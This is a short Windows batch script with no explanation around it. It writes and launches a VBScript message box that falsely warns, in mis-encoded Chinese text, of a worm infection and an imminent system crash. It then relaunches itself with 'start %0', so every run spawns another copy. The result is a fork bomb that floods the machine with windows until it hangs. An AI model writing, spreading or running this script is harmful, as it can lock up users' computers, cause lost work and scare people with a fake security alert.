@echo off
title= 
mode con cols=14 lines=1
@echo msgbox chr(13) + chr(13) + chr(13) + "WindowÏµÍ³·À»ğÇ½¼ì²âµ½Èä³æ²¡¶¾£º£×£ï£ò£í£ß£Ú£á£æ£ì£å£î£¬ÏµÍ³¼´½«½«±ÀÀ£¡£" >autorun.vbe
start autorun.vbe
ping -n 3 127.0>nul
start %0

